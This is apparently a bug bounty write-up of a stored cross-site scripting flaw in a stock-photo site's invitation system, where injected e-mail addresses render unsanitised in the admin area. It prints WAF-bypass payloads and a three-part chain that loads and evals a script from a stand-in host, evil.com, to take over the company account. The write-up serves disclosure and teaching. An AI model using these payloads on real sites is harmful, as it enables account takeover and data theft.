# XSS In Three Parts
This was the very first bug I reported to a bug bounty program. While it was first closed as informative, because I didn't find a payload without extensive user action, I managed to find a WAF-bypass to escalate it to a critical impact.

## Discovery
The target was a web application that offers stock photos that you can buy and download. It has some kind of user management, so that companies can create one account and share it with multiple users. Additional users can get access through an invitation link. This is the business logic:

* A user registers an account. He becomes automatically an admin of this account.
* He can then share an invitation link with other users
* The other user visits the invitation link and enters his e-mail-address
* The other users e-mail-address shows up in the admin-area to be confirmed / rejected by the admin

## Analysis
I started to test the allowed input for the e-mail-address. Because not every developer is aware of what characters are allowed within an e-mail-address, it's always worth to test. If a third-party library is used to check the validity of the address there is a chance that the possibility of an XSS attack is overseen.

For everyone who want's to read more about the format and allowed characters of an e-mail-address here is a [link](https://en.wikipedia.org/wiki/Email_address#Local-part).

In this case the full character-set was allowed, meaning that it was possible to use a quoted local part containing characters like `<`, `"` and `'`.

So I started to register a simple address like `"<h2>test</h2>"@example.com`. After that, the the e-mail-address showed up in the admin area of the inviting account and the HTML-tags were not sanitized. So at this point there was at least some HTML-injection.

## Exploitation
Trying some payloads that contained script tags or `on...`-attributes always ended with a `403 Forbidden` response. The only thing I found at this point was an `<a>`-tag with a javascript-URL to execute some code when the admin clicks the link. To bypass the WAF I had to use a payload like this: ``"<a href=jav&#x09;ascript:alert(1)>Click Me</a>"@example.com``.

After spending a lot of time I decided to submit this report. The next day the program closed the report as Informative without any comment or explanation. Of course it was unlikely that an admin would click the link, but it was my first report and I was very frustrated.

Anyway, I accepted the challenge and started to spend more time to find a WAF bypass to execute javascript without additional user interaction.

After a while I found a payload that bypassed the WAF. Starting the string with ``<x`a=x\ f=`>`` I was able to insert script tags like this: ``"<x`a=x\ f=`><script>alert(1)</script>"@example.com``

Unfortunately that was not the end because the local part of an e-mail-address must not exceed 64 characters. So I needed to find a way to execute code with this limited number of characters. Additionally there were some restrictions with whitespaces. They must be escaped with a backslash, but that breaks the HTML in a case like this: ``"<script\ src=https://example.com></script>"@example.com``

Eventually I came up with a solution, that creates the final payload in three steps. There was no Content Security Policy in place and at the beginning of the HTML-file jQuery was included. So the first two e-mail-addresses build up an URL to an external javascript-file that gets loaded via jQueries `$.getScript()` with `eval` in the final address:

``` html
"<x`a=x\ f=`><script>f='$.get\x53cript(\x22https://';</script>"@example.com

"<x`a=x\ f=`><script>g=f+'evil.com/t.js\x22)';</script>"@example.com

"<x`a=x\ f=`><script>eval(g)</script>"@example.com
```

## Conclusion
To exploit this bug, an attacker 

1. Needs to know the invitation-link. The token contains eight hexadecimal characters, so it could even be brute-forced.
2. Needs to enter three different e-mail-addresses with the payloads above

The victim will get an e-mail with a notification about the access request. As soon as he visits the admin area, the payload gets executed without any additional interaction.

The external script could now include some API-calls that
1.  Accept at least one of the e-mail-addresses
2.  Make the accepted user an admin
3.  Delete the orignal admin-account and maybe all other users

Eventually the attacker has full and exclusive access to the companies account.
